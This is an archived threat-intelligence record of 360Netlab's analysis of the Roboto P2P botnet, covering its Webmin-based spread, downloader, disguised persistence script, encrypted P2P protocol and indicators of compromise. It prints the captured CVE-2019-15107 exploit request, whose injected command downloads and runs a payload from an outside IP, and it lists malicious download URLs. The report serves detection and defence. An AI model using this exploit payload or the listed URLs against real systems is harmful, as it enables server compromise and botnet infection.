{
    "id": "e4998dae-f0d6-4c5a-a829-3b76d8fe84d8",
    "created_at": "2023-01-12T15:10:11.745312Z",
    "updated_at": "2025-03-27T02:05:53.502113Z",
    "deleted_at": null,
    "sha1_hash": "5fbc3a68d653824db3eeb5f04333d8cf2b14b249",
    "title": "2019-11-20 - The awaiting Roboto Botnet",
    "authors": "",
    "file_creation_date": "2022-05-29T00:55:22Z",
    "file_modification_date": "2022-05-29T00:55:22Z",
    "file_size": 2648613,
    "plain_text": "# The awaiting Roboto Botnet\n\n**blog.netlab.360.com/the-awaiting-roboto-botnet-en**\n\nAlex.Turing November 20, 2019\n\n20 November 2019 / [Roboto](https://blog.netlab.360.com/tag/roboto/)\n\n## Background introduction\n\nOn August 26, 2019, our 360Netlab Unknown Threat Detection System highlighted a\nsuspicious ELF file (4cd7bcd0960a69500aa80f32762d72bc) and passed along to our\nresearchers to take a closer look, upon further analysis, we determined it is a P2P bot\nprogram.\n\nFast forwarded to October 11, 2019, our Anglerfish honeypot captured another suspicious\nELF sample (4b98096736e94693e2dc5a1361e1a720), and it turned out to be the\nDownloader of the previous suspicious ELF sample. The Downloader sample downloads the\nabove Bot program from two hard-coded HTTP URLs. One of the addresses disguised the\nBot sample as a Google font library \"roboto.ttc\", so we named the Botnet Roboto.\n\nWe have been tracking the Roboto Botnet for nearly three months and here are some of its\ntechnical features.\n\n## Roboto Botnet overview\n\nCurrently, we have captured the Downloader and Bot modules of the Roboto Botnet, and we\nspeculate that it also has a vulnerability scanning module and a P2P control module.\n\nRoboto Botnet mainly supports 7 functions: reverse shell, self-uninstall, gather process'\nnetwork information, gather Bot information, execute system commands, run encrypted files\nspecified in URLs DDoS attack etc\n\n\n-----\n\nAt the same time, it also uses Curve25519, Ed25519, TEA, SHA256, HMAC-SHA256 and\nother algorithms to ensure the integrity and security of its components and P2P network,\ncreate the corresponding Linux self-starting script based on the target system, and disguise\nits own files and processes name to gain persistence control.\n\nRoboto Botnet has DDoS functionality, but it seems DDoS is not its main goal. We have yet\nto captured a single DDoS attack command since it showed up on our radar. We still yet to\nlearn its true purpose.\n\n## Propagation\n\nOn October 11th, 2019, the Anglerfish honeypot caught `51.38.200.230 spreading`\nDownloader sample `4b98096736e94693e2dc5a1361e1a720 via the Webmin RCE`\nvulnerability (CVE-2019-15107) . The download URL is `http://190.114.240.194/boot,`\nthe following is the exploit Payload.\n```\nPOST /password_change.cgi HTTP/1.1\nHost: {target}:10000\nUser-Agent: Go-http-client/1.1\nAccept: */*\nReferer: https://{target}:10000/session_login.cgi\nCookie: redirect=1; testing=1; sid=x; sessiontest=1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 270\nuser=daemon&pam=&new1=x&new2=x&old=x%7Cwget%20190.114.240.194%2Fboot%20O%20%2Ftmp%2F93b5b5e8%3Bchmod%20777%20%2Ftmp%2F93b5b5e8%3B%2Ftmp%2F93b5b5e8%26&expired\nO%20%2Ftmp%2F93b5b5e8%3Bchmod%20777%20%2Ftmp%2F93b5b5e8%3B%2Ftmp%2F93b5b5e8%26% \n\n```\nWe can see that `51.38.200.230 itself also has the same Webmin service (TCP/10000)`\nopen, guess it was also infected.\n\n## Reverse analysis\n\n### Roboto Downloadersample analysis\n\nMD5: 4b98096736e94693e2dc5a1361e1a720\n\nELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, stripped\n\nLibrary: musl-libc\n\nThe main function of Roboto Downloader is to download the corresponding encrypted\nRoboto Bot program from the specified URL according to the CPU architecture of the victim\nmachine, and then decrypt and execute it.\n\n\n-----\n\nCurrently, Roboto Downloader supports both i386 and x86_64 architectures.\n\nThe Roboto Downloader sample hard-coded URL stores the encrypted Roboto Bot program.\nEach group of URLs has a corresponding decryption key and SHA256 check value.\n\nTake image2.jpg as an example. Its SHA256 hash value is consistent with the hard-coded\nSHA256 hash value in the Roboto Downloader sample.\n\n\n-----\n\nThe decryption algorithm is as follows, the Key length is 8 bytes, and each round will\ncalculate a new XOR Key.\n\n\n-----\n\nAfter decrypting, we got the Roboto Bot sample.\n\nThe initial XOR Key is not known, but the characteristics of the XOR encryption algorithm\ncan be used to get the bot file.\n\nAccording to the feature that the value of elf_header[0x8:0xf] is often 0, the Bot file can be\ndecrypted by the following method.\n\n\n-----\n\n```\n     fstream file(filename, ios::binary | ios::in);\n     file.read((char*)fstr.data(), fsize);\n     file.close();\n     string skey(fstr, 8, 8);\n     reverse(skey.begin(), skey.end());\n     uint64_t *sskey = (uint64_t*)&skey[0];\n     cout << hex << \"sskey= \" << *sskey << endl;\n     fstr[0] = '\\x7F';\n     fstr[1] = 'E';\n     fstr[2] = 'L';\n     fstr[3] = 'F';\n     fstr[6] = '\\x01';\n     fstr[7] = '\\x00';\n     fsize -= 8;\n     uint64_t cnt = fsize / 8;\n     uint8_t rmd = fsize % 8;\n     for (uint64_t i = 0; i < cnt; i++) {\n          for (int j = 0; j < 8; j++)\n          {\n              fstr[8 + i * 8 + j] ^= *((uint8_t*)sskey + 7 - j);\n          }\n          uint64_t rnda = *sskey << 13 ^ *sskey;\n          uint64_t rndb = rnda >> 7 ^ rnda;\n          uint64_t rndc = rndb << 17 ^ rndb;\n          *sskey = rndc;\n     }\n     for (uint8_t i = 0; i < rmd; i++)\n     {\n          fstr[8 * cnt + 8 + i] ^= *((uint8_t*)sskey + rmd - i);\n     }\n     if (fstr[42] == '\\x20' && fstr[46] == '\\x28')\n     {\n          fstr[4] = '\\x01';\n          fstr[5] = '\\x01';\n     }\n     if (fstr[43] == '\\x20' && fstr[47] == '\\x28')\n     {\n          fstr[4] = '\\x01';\n          fstr[5] = '\\x02';\n     }\n     if (fstr[54] == '\\x38' && fstr[58] == '\\x40')\n     {\n          fstr[4] = '\\x02';\n          fstr[5] = '\\x01';\n     }\n     if (fstr[55] == '\\x38' && fstr[59] == '\\x40')\n     {\n          fstr[4] = '\\x02';\n          fstr[5] = '\\x02';\n     }\n\n### Roboto Bot sample analysis\n\n```\nMD5: d88c737b46f1dcb981b4bb06a3caf4d7\n\n\n-----\n\nELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, stripped\nLibrary: musl-libc\n\nAs aforementioned, Roboto Bot has server build in functions and disguise itself on the victim\nhost.\n\n**Disguise**\n\nCreate self-starting script based on the release version of the Linux system\n```\n   /etc/init.d/dns-clear or systemd-hwdb-upgrade.service\n   #! /bin/sh\n   ### BEGIN INIT INFO\n   # Provides:     dns-clear\n   # Required-Start:  $local_fs $remote_fs $network\n   # Required-Stop:   $local_fs\n   # Default-Start:   1 2 3 4 5\n   # Default-Stop:\n   # Short-Description: Cleans up any mess left by 0dns-up\n   ### END INIT INFO\n   PATH=/sbin:/bin:/usr/sbin:/usr/bin\n   case \"$1\" in\n    start)\n       /usr/lib/libXxf86dag.so.1.0.0 &\n       ;;\n    *)\n       ;;\n   esac\n   exit 0\n\n```\nFake Process names\n```\n   (sd-pam)\n   /sbin/rpcbind\n   /usr/bin/python\n   upstart-socket-bridge\n   /usr/sbin/irqbalance\n   /lib/systemd/systemd-udevd\n   /usr/libexec/postfix/master\n\n```\nFile name for masquerading\n```\n   libXxf86dag.so\n   .node_repl_history.gz\n\n```\n**Hard coded Peer information**\n\n\n-----\n\nRoboto Bot hardcoded 4 sets of Peers, the structure is IP: PORT: Curve25519_Pub Key\n```\nPeer 1:\n     213.159.27.5:57491\nPubkey:\n     8E A5 64 E2 A5 F7 73 6D 2E F2 86 D3 7B B7 86 E4 \n     7F 0D A7 A0 77 B1 AD 24 49 5B DE D6 DB B7 E1 79\nPeer 2:\n     186.46.45.252:52085\nPubkey:\n     93 DA 64 B3 1F 49 1B A4 B5 2D 28 92 49 52 7C 3D \n     41 D2 4F B2 8B FF 2C ED A2 E7 90 18 4F 9E C0 7B\nPeer 3:\n     95.216.17.209:57935\nPubkey:\n     E8 78 31 C6 55 9A 13 FC AB DB 75 9B A5 B1 D6 05 \n     F2 3A 72 FF 04 B5 9F 7F 5A 8B 12 56 F2 CA 01 5E\nPeer 4:\n     120.150.43.45:49252\nPubkey:\n     E7 30 7D 3C BC 93 4A EC ED D8 FD 9F B9 FE 93 B7 \n     F3 53 B3 11 5D F7 C8 CA 0C F8 77 D1 34 CA 37 20\n\n```\nThe third peer has the following modification in the sample\n\n```\n4cd7bcd0960a69500aa80f32762d72bc\n\n```\n\n-----\n\n```\nPeer 3:\n     66.113.179.13:33543\nPubkey:\n     B3 E5 B3 D6 E6 DE 7C 7D 79 40 A5 4F D9 B0 AC 7B \n     2D C6 CE 69 EF F3 C4 58 F2 98 A8 92 DF 92 9E 0E\n\n```\n**Encryption verfication**\n\nRoboto Bot uses algorithms such as Curve25519, TEA, and HMAC-SHA256 to implement\ndata encryption and validity verification. This method is widely been used in the generation of\ncfg files and data packets.\n\n\n-----\n\nThe general process is as shown\n\n\n-----\n\n**Curve25519_PrivateKey is generated by /dev/urandom.**\n\n**cfg file**\n\nRoboto Bot will store the generated cfg files in different file locations depending on the\nprivilege it runs.\n```\n$home/.config/trolltech.conf   //run as regular user\n/etc/iproute2/rt_ksfield     //run as root\n\n```\nThe cfg file contains the private key, the encrypted data, and the HMAC-SHA256 value of the\nencrypted data, which are updated every hour. The encrypted data is composed of Peer and\nPort information, and its structure is peer:length:data,pcfg:length:data.\n\n\n-----\n\nCfg file decryption example\n```\nThe first 0x20 byte，Curve25519 private key\n  68 F4 83 18 2C F2 80 3D D1 B3 FF 68 FB 35 3D E8 \n  E6 C8 DB 0B 8E FC 73 7C 01 B3 6F 3F 1C 89 38 63\nThe last 0x20 byte，hmac-sha256 hash (0x20-0x165)\n  1B 64 C4 FD 65 C0 95 9B 6F B1 D7 C1 75 31 DA 5A \n  01 EC E1 52 06 25 E9 7D A1 9B 57 E5 CA 67 2B D6\nEncryption verification\n1. Generate publicKey:\n  52 25 27 87 F2 B2 F7 35 32 1F ED A7 6A 29 03 A8 \n  3F A4 51 58 EF 53 F5 6F 28 99 01 8E 62 2C 4A 24\n2. Using last 16 bytes, DWORD reverse，to be used as encryption key for TEA:\n  58 51 A4 3F 6F F5 53 EF 8E 01 99 28 24 4A 2C 62\n3. Using the above Key, to get XOR Key:\n  First round: ED 16 FB 00 46 4F 94 99\n4. XOR decryption，repeat step 4 on every 8 byte，to update XOR Key:\n  Ciphertext: 9D 73 9E 72 76 4E DE 99\n  Plaintext: peer\\x30\\x01\\x4a\\x00\\x00\n\n```\nTherefore, we know that Peer has 0x130 bytes of information, and so on, the plaintext of the\nciphertext (8E 3C 1F 93 B1 C9) is (pcfg\\x04\\x00).\n\n**P2P control module**\n\n\n-----\n\nRoboto Bot can be controlled by a Unix domain socket. The bound path is `/tmp/.cs`\n\nThe following code starts the control process\n\nWe did not find the relevant code to set the environment variable \"CS\" in the Roboto Bot\nsample, so we speculated that it is in the Roboto P2P control module. It starts a process,\nsets the environment to \"CS\", and controls the Roboto Bot module through a Unix domain\nsocket. then the P2P node becomes the control node in the Botonet P2P network.\n\nWe can get a good idea on the functions of the P2P control module through the Roboto Bot\nmodule, these function names are very intuitive.\n\nWe tested some of the control commands by hijacking the Roboto Bot program. Here are\nsome test results.\n\n\n-----\n\n```\ninfo The command will display hard-coded information and public key information,\n\n```\nincluding the `v17, we suspect it is a program version number.`\n```\npeers The command displays the P2P node information currently connected by Roboto\n\n```\nBot.\n\n**Bot function**\n\nReverse shell\n\n\n-----\n\nSelf uninstall\n\nExecution system command\n\nGet process network information (traverse process list, get process, network and\ncrontab file information) and upload it to the specified HTTP interface\n\n\n-----\n\n```\n/proc/%s/exe\n/proc/%s/cmdline\n/proc/net/tcp\n/proc/net/udp\ncrontab\n\n```\nGet the Bot information and upload it to the specified HTTP interface.\n\n\n-----\n\nRun the encrypted file in the specified URL (similar to the Roboto Downloader function)\n\nThe DDoS attack\n\nDepending on the running privilege it gets, Bot provides four DDoS attack methods:\nICMP Flood, HTTP Flood, TCP Flood, and UDP Flood.\n\n**P2P communication protocol**\n\nBesides using the P2P communication protocol, Roboto Bot employs algorithms such as\nCurve25519, TEA, and HMAC-SHA256 to ensure data integrity and security. The encrypted\nKey is derived from the Curve25519_SharedKey generated by the public key in the Bot and\nC2 information. The format of the packet is index(4 bytes):type(1 byte):data:hmacsha256[0:0xf], so packets larger than 21 bytes contain valid information.\n\nP2P node discovery data verification\n\n\n-----\n\nThe length of the request packet is a fixed 69 bytes, the data is not encrypted, and the\ncontent is the public key of the target Peer and the public key of the Bot. After receiving the\nBot request packet, Peer establishes a connection with the Bot if it is consistent with its own\npublic key, and then calculates the SharedKey through the public key. In the subsequent\ncommunication process, the message with valid information (length greater than 21 words)\nSection) will be encrypted.\n\nP2P node discovery data decryption\n\nThe local Petoto Bot sample is communicated with the hard-coded Peer (186.46.45.252),\nand a new Peer node 87.249.15.18:63104 is taken as an example.\n\nBot request, 69 bytes\n\n\n-----\n\n```\nindex: 00 00 00 00 \ntype: 2\ndata:\n     0-31: C2 Curve25519_PublicKey\n          93 DA 64 B3 1F 49 1B A4 B5 2D 28 92 49 52 7C 3D \n          41 D2 4F B2 8B FF 2C ED A2 E7 90 18 4F 9E C0 7B\n     32-63: Bot Curve25519_PublicKey\n          52 25 27 87 F2 B2 F7 35 32 1F ED A7 6A 29 03 A8 \n          3F A4 51 58 EF 53 F5 6F 28 99 01 8E 62 2C 4A 24\n\n```\nPeer reply, 60 bytes,\n```\nindex: 00 00 00 00\ntype: 00\ndata:\n     cmdtype:\n          4f \n     ip:port\n          44 be 1c 18 da 42 \n     PublibcKey:\n          7e 42 89 b6 36 5f 73 10 88 ea 60 36 b9 ca 89 25 \n          3e 3e e3 2f 7e b6 d6 08 9e 96 89 25 68 a0 9f 7f\n     Hmac-sha256[0:0xf]\n          b5 1a d7 0d d4 63 83 0e de 06 34 ad 36 cc 83 4e\n\n```\nAnalog decryption verification process\n```\n1. Bot’s private key and Pee’s public key to generate shared key\nSharedKey:\n    28 EC 2D A8 63 F3 2D 39 8F 1C 03 96 32 AE F2 D8 \n    B8 D1 9E 6C ED BD AC 2C BE D6 CF 60 83 C9 D6 1D\n2. Using first 16 byte of HMAC-SHA256 for verification\n     HMAC-SHA256[0:0XF]=\n     b5 1a d7 0d d4 63 83 0e de 06 34 ad 36 cc 83 4e\n3. Using last 16 bytes of the sharedkey, DWORD reverse，to be used as encryption key\nfor TEA:\n     A8 2D EC 28 39 2D F3 63 96 03 1C 8F D8 F2 AE 32\n4. Using the above Key, to get XOR Key:\n     First round: 4E 13 47 13 0A 2C C2 6A\n     Second round: B0 68 BD EB 9B 29 10 23\n     Third round: AD B4 3D 34 40 C0 3D FC\n     Fourth round: 31 1E 6B F0 EA D5 8E 65\n     Fivth round: D1 1C 42 58 2A 0C 7D A4\n5. XOR dencryption，repeat step 4 on every 8 byte，to update XOR Key and get plaintext\n  cmdtype:\n    01\n  ip:port:\n    57 F9 0F 12 :F6 80 (87.249.15.18:63104)\n  PublicKey: \n    14 F2 E1 0B DD C4 5A 00 AB 47 D4 0B 8D 8A 49 18 \n    C2 0F FD 44 8E 5C 03 86 FB 47 95 67 30 8A 93 02\n\n```\n\n-----\n\nFrom the following network packets, we can see `87.249.15.18:63104 is exactly what we`\ncalculated.\n\nAttack command verification\n\nIn a P2P network, nodes are untrustworthy, and anyone can forge a P2P node at a very low\ncost. In order to ensure that the Roboto network is completely controllable and not stolen by\nothers, Roboto needs to perform signature verification for each attack command. Only the\nattack messages that can be signed and signed can be accepted and executed by the\nRoboto node.\n\nThe verification method adopted by Roboto is ED25519, which is a public digital signature\nalgorithm. At the same time, the check public key\nis: 60FF4A4203433AA2333A008C1B305CD80846834B9BE4BBA274F873831F04DF1C, the\npublic key is integrated into each of the Roboto Bot samples.\n\n### Suggestions\n\nWe recommend that Webmin users take a look whether they are infected by checking the\nprocess, file name and UDP network connection as we coverd above.\n\nWe recommend that Roboto Botnet related IP, URL and domain names to be monitored and\nblocked.\n\n### Contact us\n\n[Readers are always welcomed to reach us on twitter, WeChat 360Netlab or email to netlab](https://twitter.com/360Netlab)\nat 360 dot cn.\n\n**IoC list**\n\nSample MD5\n```\n4b98096736e94693e2dc5a1361e1a720\n4cd7bcd0960a69500aa80f32762d72bc\nd88c737b46f1dcb981b4bb06a3caf4d7\n\n```\nEncrypted Roboto Bot MD5\n```\nimage.jpg     de14c4345354720effd0710c099068e7\nimage2.jpg    69e1cccaa072aedc6a9fd9739e2cdf90\nroboto.ttc    f47593cceec08751edbc0e9c56cad6ee\nroboto.ttf    3020c2a8351c35530ab698e298a5735c\n\n```\n\n-----\n\nURL\n```\nhttp://190.114.240.194/boot\nhttp://citilink.dev6.ru/css/roboto.ttc\nhttp://citilink.dev6.ru/css/roboto.ttf\nhttp://144.76.139.83:80/community/uploadxx/1461C493-38BF-4E72-B118BE35839A8914/image.jpg\nhttp://144.76.139.83:80/community/uploadxx/1461C493-38BF-4E72-B118BE35839A8914/image2.jpg\n\n```\nHard-coded Peer IP\n```\n95.216.17.209     Finland        ASN 24940       Hetzner\nOnline GmbH \n213.159.27.5     Italy         ASN 201474      Aircom\nService srl \n186.46.45.252     Ecuador        ASN 28006       CORPORACION\nNACIONAL DE TELECOMUNICACIONES - CNT EP\n120.150.43.45     Australia       ASN 1221       Telstra\nCorporation Ltd\n66.113.179.13     United States     ASN 14280       NetNation\nCommunications Inc\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2019/2019-11-20 - The awaiting Roboto Botnet.pdf"
    ],
    "report_names": [
        "2019-11-20 - The awaiting Roboto Botnet.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536211,
    "ts_updated_at": 1743041153,
    "ts_creation_date": 1653785722,
    "ts_modification_date": 1653785722,
    "files": {
        "pdf": "https://archive.orkl.eu/5fbc3a68d653824db3eeb5f04333d8cf2b14b249.pdf",
        "text": "https://archive.orkl.eu/5fbc3a68d653824db3eeb5f04333d8cf2b14b249.txt",
        "img": "https://archive.orkl.eu/5fbc3a68d653824db3eeb5f04333d8cf2b14b249.jpg"
    }
}